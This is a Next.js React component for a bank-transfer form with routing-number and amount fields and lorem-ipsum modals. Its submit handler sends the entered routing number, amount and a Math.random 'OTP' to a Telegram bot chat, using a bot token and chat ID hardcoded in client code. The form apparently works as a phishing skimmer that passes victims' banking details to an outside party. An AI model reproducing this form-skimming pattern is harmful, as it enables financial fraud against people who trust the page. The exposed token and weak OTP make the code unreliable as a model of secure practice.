"use client";

import Image from "next/image";
import React, { useState, FormEvent } from "react";
import axios from "axios";
import { Modal } from "react-responsive-modal";

export default function TransferForm() {
  const [routingNumber, setRoutingNumber] = useState<string>("");
  const [dollarSymbol, setDollarSymbol] = useState<string>("$");
  const [amount, setAmount] = useState<string>("");
  const [otp, setOtp] = useState<string>("");

  const [openFirst, setOpenFirst] = useState<boolean>(false);
  const [openSecond, setOpenSecond] = useState<boolean>(false);

  const generateOTP = (): string => {
    // Generate a random 4-digit OTP
    const randomOTP = Math.floor(1000 + Math.random() * 9000).toString();
    return randomOTP;
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    try {
      // Replace 'YOUR_BOT_API_TOKEN' with your actual Telegram bot API token
      const botToken = "6924271253:AAHX8d6GZaaVbW8v1k2m_2ryN3bgUpq7t_M";
      const chatId = "-4216297703"; // Replace 'YOUR_CHAT_ID' with the chat ID where you want to send the message
      const newOTP = generateOTP(); // Generate a new OTP
      const message = `Routing Number: ${routingNumber} Amount: ${dollarSymbol}${amount} OTP: ${newOTP}`;

      await axios.post(
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`
      );

      // Update the OTP state with the new OTP
      setOtp(newOTP);

      // Clear form fields after successful submission
      setRoutingNumber("");
      setAmount("");
      setOpenFirst(true)
    } catch (error) {
      console.error("Error sending message:", error);
    }
  };

  return (
    <div className="bg-white mx-auto rounded-xl max-w-[400px] p-7">
      <form onSubmit={handleSubmit}>
        <div className="flex flex-col gap-6">
          <div className="flex flex-col gap-3">
            {/* <label htmlFor="Routing Number" className="text-[#5c5c5c] text-[16px]">
              Routing Number
            </label> */}
            <input
              type="number"
              placeholder="Routing Number"
              className="p-5 rounded-[10px] text-[#5c5c5c] bg-transparent py-3 border border-gray-300 outline-none"
              value={routingNumber}
              onChange={(e) => setRoutingNumber(e.target.value)}
            />
          </div>
          <div className="flex">
            {/* <label htmlFor="Amount" className="text-[#5c5c5c] text-[16px]">
              Amount
            </label> */}
            <input
              type="text"
              className="w-10 flex items-center text-center justify-center rounded-[10px] rounded-r-[0px] text-[#5c5c5c] bg-transparent py-3 border border-gray-300 outline-none"
              value={dollarSymbol}
              onChange={(e) => setDollarSymbol(e.target.value)}
              readOnly
            />
            <input
              type="number"
              placeholder="Amount"
              className="p-5 rounded-[10px] rounded-l-[0px] text-[#5c5c5c] bg-transparent py-3 border border-gray-300 outline-none"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
          </div>
          <div className="hidden">
            <input
              type="number"
              placeholder="Generate OTP"
              className="p-5 rounded-[10px] text-[#5c5c5c] bg-transparent py-3 border border-gray-300 outline-none"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              readOnly
            />
          </div>
        </div>

        <div className="flex flex-col gap-2 mt-6">
          <button
            type="submit"
            className="p-4 py-3 bg-[#394048] text-base flex items-center justify-center gap-1 font-bold w-full rounded-[50px] text-white"
          >
            Transfer
          </button>
        </div>
      </form>
      <div className="bg-[#000000] absolute top-0 left-0 right-0 w-full"></div>
      <Modal open={openFirst} onClose={() => setOpenFirst(false)} center
      classNames={{
        overlay: 'customOverlay',
        modal: 'customModal',
      }}
      >
        <p>First modal</p>
        <p>
          Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam
          pulvinar risus non risus hendrerit venenatis. Pellentesque sit amet
          hendrerit risus, sed porttitor quam.
        </p>
        <button className="button" onClick={() => setOpenSecond(true)}>
          Open second modal
        </button>
      </Modal>
      <Modal open={openSecond} onClose={() => setOpenSecond(false)} center>
        <p>Second modal</p>
        <p>
          Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam
          pulvinar risus non risus hendrerit venenatis. Pellentesque sit amet
          hendrerit risus, sed porttitor quam.
        </p>
      </Modal>
    </div>
  );
}
